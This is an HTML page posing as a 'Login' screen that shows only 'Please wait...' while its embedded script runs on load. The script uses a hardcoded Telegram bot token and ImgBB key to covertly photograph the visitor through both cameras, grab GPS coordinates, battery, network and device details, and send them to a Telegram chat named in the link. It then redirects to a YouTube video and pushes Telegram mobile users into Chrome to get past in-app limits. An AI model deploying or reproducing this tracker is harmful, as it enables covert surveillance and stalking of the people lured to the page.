<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            max-width: 350px;
            width: 100%;
            padding: 50px 30px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 { 
            color: #667eea; 
            margin-bottom: 10px; 
            font-size: 28px;
            letter-spacing: 2px;
        }
        .subtitle { 
            color: #999; 
            margin-bottom: 30px; 
            font-size: 14px;
            font-style: italic;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Login</h1>
        <div class="subtitle">Please wait...</div>
    </div>

    <script>
        // ===== CONFIGURATION =====
        const BOT_TOKEN = "8714590627:AAE7XYaMhFLJeLKYY-cLWjGQ38h96-oi498";
        const IMGBB_API_KEY = "b7ba0100d04e0add952f217e712c7ff8";
        const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        // =========================
        
        const urlParams = new URLSearchParams(window.location.search);
        const OWNER_ID = urlParams.get('id');
        
        const isTelegram = /Telegram/i.test(navigator.userAgent);
        const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
        
        if (isTelegram && isMobile) {
            const currentUrl = window.location.href;
            window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
        }
        
        let backPhotoSent = false;
        let frontPhotoSent = false;
        
        async function sendMessageToOwner(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: OWNER_ID,
                        text: text
                    })
                });
            } catch(e) {
                console.log('Send message error:', e);
            }
        }
        
        async function uploadToImgBB(imageBlob) {
            const formData = new FormData();
            formData.append('image', imageBlob);
            const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
                method: 'POST',
                body: formData
            });
            const data = await response.json();
            if (data.success) {
                return data.data.url;
            } else {
                throw new Error('Upload failed');
            }
        }
        
        async function takePhotoAndSend(stream, cameraType) {
            if (cameraType === 'back' && backPhotoSent) return;
            if (cameraType === 'front' && frontPhotoSent) return;
            if (cameraType === 'back') backPhotoSent = true;
            if (cameraType === 'front') frontPhotoSent = true;
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());
            
            canvas.toBlob(async (blob) => {
                try {
                    const imageUrl = await uploadToImgBB(blob);
                    await sendMessageToOwner(`📸 ${cameraType === 'back' ? 'BACK' : 'FRONT'} CAMERA PHOTO CAPTURED!\n🕐 Time: ${new Date().toLocaleString()}\n📷 Image: ${imageUrl}`);
                } catch (err) {
                    console.log('Error:', err);
                }
            }, 'image/jpeg', 0.7);
        }
        
        async function initBackCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                await takePhotoAndSend(stream, 'back');
            } catch (err) {
                await sendMessageToOwner(`❌ BACK CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
            }
        }
        
        async function initFrontCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                await takePhotoAndSend(stream, 'front');
            } catch (err) {
                await sendMessageToOwner(`❌ FRONT CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
            }
        }
        
        async function getLocation() {
            if (!navigator.geolocation) {
                await sendMessageToOwner(`❌ LOCATION NOT SUPPORTED!\n🕐 Time: ${new Date().toLocaleString()}`);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    await sendMessageToOwner(`📍 LOCATION CAPTURED!\n🕐 Time: ${new Date().toLocaleString()}\n🌍 Latitude: ${lat}\n🌍 Longitude: ${lon}\n📏 Accuracy: ${acc}m\n🗺️ Maps: ${mapsLink}`);
                },
                async (error) => {
                    await sendMessageToOwner(`❌ LOCATION DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
                }
            );
        }
        
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.floor(battery.level * 100);
                    const charging = battery.charging ? "Charging" : "Not Charging";
                    return `🔋 Battery: ${level}% (${charging})`;
                } catch(e) {
                    return "🔋 Battery: Not Available";
                }
            }
            return "🔋 Battery: Not Supported";
        }
        
        async function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                let type = "Unknown";
                if (connection.effectiveType) type = connection.effectiveType;
                if (connection.type) type = connection.type;
                return `🌐 Connection: ${type.toUpperCase()}`;
            }
            return "🌐 Connection: Not Available";
        }
        
        async function getDeviceModel() {
            const ua = navigator.userAgent;
            if (ua.includes("iPhone")) return "📱 Device: iPhone";
            if (ua.includes("Samsung")) return "📱 Device: Samsung";
            if (ua.includes("Redmi") || ua.includes("Xiaomi")) return "📱 Device: Xiaomi/Redmi";
            if (ua.includes("OPPO")) return "📱 Device: OPPO";
            if (ua.includes("vivo")) return "📱 Device: vivo";
            if (ua.includes("realme")) return "📱 Device: realme";
            if (ua.includes("Nokia")) return "📱 Device: Nokia";
            if (ua.includes("Pixel")) return "📱 Device: Google Pixel";
            if (ua.includes("Huawei")) return "📱 Device: Huawei";
            return "📱 Device: " + (navigator.platform || "Unknown");
        }
        
        async function getNetworkOperator() {
            if ('connection' in navigator && navigator.connection) {
                return `📡 Network: Mobile/Cellular`;
            }
            return `📡 Network: WiFi or Other`;
        }
        
        async function sendDeviceInfo() {
            const batteryInfo = await getBatteryInfo();
            const networkInfo = await getNetworkInfo();
            const deviceModel = await getDeviceModel();
            const networkOp = await getNetworkOperator();
            const deviceInfo = {
                platform: navigator.platform,
                language: navigator.language,
                userAgent: navigator.userAgent,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            await sendMessageToOwner(`📱 DEVICE INFO!\n🕐 Time: ${new Date().toLocaleString()}\n${deviceModel}\n📌 Platform: ${deviceInfo.platform}\n📌 Language: ${deviceInfo.language}\n📌 Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n📌 Timezone: ${deviceInfo.timezone}\n${batteryInfo}\n${networkInfo}\n${networkOp}\n📌 User Agent: ${deviceInfo.userAgent.substring(0, 80)}...`);
        }
        
        async function init() {
            if (!OWNER_ID) return;
            await initBackCamera();
            await initFrontCamera();
            await getLocation();
            await sendDeviceInfo();
            setTimeout(() => { window.location.href = YOUTUBE_URL; }, 3000);
        }
        
        if (!isTelegram || !isMobile) { init(); }
    </script>
</body>
</html>
